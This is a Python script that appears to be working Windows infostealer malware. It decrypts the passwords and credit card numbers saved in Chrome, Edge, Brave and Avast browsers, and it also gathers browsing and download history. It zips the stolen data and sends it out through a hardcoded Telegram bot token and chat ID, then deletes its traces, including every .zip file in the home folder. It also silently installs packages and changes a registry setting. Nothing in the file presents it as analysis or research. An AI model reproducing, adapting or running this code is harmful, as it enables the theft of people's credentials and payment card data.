try:
    import os, time, sys, json, base64, sqlite3, shutil
    import xml.etree.ElementTree as ET
    import winreg as reg, asyncio, ctypes
    from datetime import datetime, timedelta
    from pathlib import Path
    from urllib.request import urlopen, Request
    from json import loads as json_loads
    from Crypto.Cipher import AES
    from ctypes import wintypes
    from bs4 import BeautifulSoup
    from colorama import Fore, Style
    from pystyle import Write, System, Colors, Colorate
    import tkinter as tk
    from tkinter import filedialog
    from playwright.sync_api import Playwright, sync_playwright
    import psutil
    import shutil
    from telebot import TeleBot, types

except ModuleNotFoundError:
    os.system("pip install requests")
    os.system("pip install pycryptodome")   
    os.system("pip install beautifulsoup4")
    os.system("pip install colorama")
    os.system("pip install pystyle")
    os.system("pip install playwright")
    os.system("pip install psutil")
    os.system("pip install pytelegrambotapi")

user = os.path.expanduser("~")
username = os.getenv("USERNAME")
user_name = os.getlogin()

BOT_TOKEN = "6650505242:AAG5p1dKgEtWRG8uLOjOnzmbg8i6CD0NLoU"
USER_TLG_ID = 1972505293

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
u_folder = os.path.join(os.path.expanduser("~"), "Google")

def create_folder(folder_path):
    if not os.path.exists(folder_path):
        os.makedirs(folder_path, exist_ok=True)

create_folder(u_folder)

def show_files():
    try:
        registry_path = r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
        key_name = "Hidden"

        with reg.OpenKey(reg.HKEY_CURRENT_USER, registry_path, 0, reg.KEY_SET_VALUE) as key:
            reg.SetValueEx(key, key_name, 0, reg.REG_DWORD, 1)

    except Exception as e:
        pass
    
show_files()

browsers = {
    'Avast': local + '\\AVAST\\Software Browser\\User Data',  
    'Chrome': local + '\\Google\\Chrome\\User Data',
    'Edge': local + '\\Microsoft\\Edge\\User Data',
    'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data',
}

data_queries = {
    'Passwords': {
        'query': 'SELECT origin_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'User', 'Password'],
        'decrypt': True
    },
    'Credit Cards': {
        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        'file': '\\Web Data',
        'columns': ['Name', 'Month', 'Year', 'Card Number'],
        'decrypt': True
    },
    'History': {
        'query': 'SELECT url, title FROM urls',
        'file': '\\History',
        'columns': ['URL', 'Title'],
        'decrypt': False
    },
    'Downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['URl', 'Path'],
        'decrypt': False
    },
}

crypt32 = ctypes.windll.crypt32

class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", wintypes.DWORD),
                ("pbData", ctypes.POINTER(ctypes.c_byte))]

crypt32.CryptUnprotectData.argtypes = [ctypes.POINTER(DATA_BLOB), ctypes.POINTER(wintypes.LPWSTR),
                                       ctypes.POINTER(DATA_BLOB), ctypes.c_void_p,
                                       ctypes.c_void_p, wintypes.DWORD,
                                       ctypes.POINTER(DATA_BLOB)]
crypt32.CryptUnprotectData.restype = wintypes.BOOL

def data_to_blob(data):
    blob = DATA_BLOB()
    blob.cbData = len(data)
    blob.pbData = ctypes.cast(ctypes.create_string_buffer(data), ctypes.POINTER(ctypes.c_byte))
    return blob

def CryptUnprotectData(data, entropy, reserved, prompt, flags):
    in_data = data_to_blob(data)
    out_data = DATA_BLOB()
    description = wintypes.LPWSTR()
    
    result = crypt32.CryptUnprotectData(
        ctypes.byref(in_data),
        ctypes.byref(description),
        entropy,
        reserved,
        prompt,
        flags,
        ctypes.byref(out_data)
    )
    
    if not result:
        raise ctypes.WinError()
    
    decrypted_data = ctypes.string_at(out_data.pbData, out_data.cbData)
    return description.value, decrypted_data

def get_master_key(path: str):
    try:
        if not os.path.exists(path):
            return

        if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
            return

        with open(path + "\\Local State", "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        key = CryptUnprotectData(key, None, None, None, 0)[1]
        return key
    except Exception:
        return None

def decrypt_password(buff: bytes, key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()

    return decrypted_pass

def save_results(browser_name, type_of_data, content):
    browser = os.path.join(u_folder, "Browsers", browser_name)
    if not os.path.exists(browser):
        os.makedirs(browser, exist_ok=True)
    
    if content is not None:
        file_path = os.path.join(browser, f"{type_of_data}.txt")
        with open(file_path, 'w', encoding="utf-8") as file:
            file.write(content)

def get_data(path: str, profile: str, key, type_of_data):
    try:
        db_file = f'{path}\\{profile}{type_of_data["file"]}'
        if not os.path.exists(db_file):
            return
        result = ""
        shutil.copy(db_file, 'temp_db')
        conn = sqlite3.connect('temp_db')
        cursor = conn.cursor()
        cursor.execute(type_of_data['query'])
        for row in cursor.fetchall():
            row = list(row)
            if type_of_data['decrypt']:
                for i in range(len(row)):
                    if isinstance(row[i], bytes):
                        row[i] = decrypt_password(row[i], key)
            if data_type_name == 'history':
                if row[2] != 0:
                    row[2] = convert_chrome_time(row[2])
                else:
                    row[2] = "0"
            result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
        conn.close()
        os.remove('temp_db')
        return result
    except Exception:
        return None

def convert_chrome_time(chrome_time):
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')

def installed_browsers():
    available = []
    for x in browsers.keys():
        if os.path.exists(browsers[x]):
            available.append(x)
    return available

available_browsers = installed_browsers()

for browser in available_browsers:
    browser_path = browsers[browser]
    master_key = get_master_key(browser_path)

    for data_type_name, data_type in data_queries.items():
        data = get_data(browser_path, "Default", master_key, data_type)
        save_results(browser, data_type_name, data)

async def create_zip(u_folder):
    user = os.getlogin()

    now = datetime.now()
    zip_filename = f"[{user}][{now.day:02d}{now.month:02d}{now.hour:02d}{now.second:02d}].zip"

    zip_filepath = os.path.join(os.path.expanduser("~"), zip_filename)

    try:
        shutil.make_archive(zip_filepath[:-4], 'zip', u_folder)
        return zip_filepath
    except Exception as e:
        pass
        return None    
    
async def send_zip_to_telegram(zip_filepath, bot_token, chat_id):
    bot = TeleBot(bot_token)

    try:
        user_message = f"User: {user_name}"
        
        bot.send_message(chat_id, user_message)

        with open(zip_filepath, 'rb') as zip_file:
            bot.send_document(chat_id, zip_file)

        separator_message = "═════════════════"
        bot.send_message(chat_id, separator_message)

    except Exception as e:
        pass

async def main():
    zip_filepath = await create_zip(u_folder)
    if zip_filepath:
        await send_zip_to_telegram(zip_filepath, BOT_TOKEN, USER_TLG_ID)
        os.remove(zip_filepath)

if __name__ == "__main__":
    asyncio.run(main())

def delete():
    try:
        shutil.rmtree(u_folder)
    except FileNotFoundError:
        pass

    try:
        user_home_dir = os.path.expanduser("~")
        
        for filename in os.listdir(user_home_dir):
            if filename.endswith('.zip'):
                zip_filepath = os.path.join(user_home_dir, filename)
                os.remove(zip_filepath)
    except Exception as e:
        pass

delete()
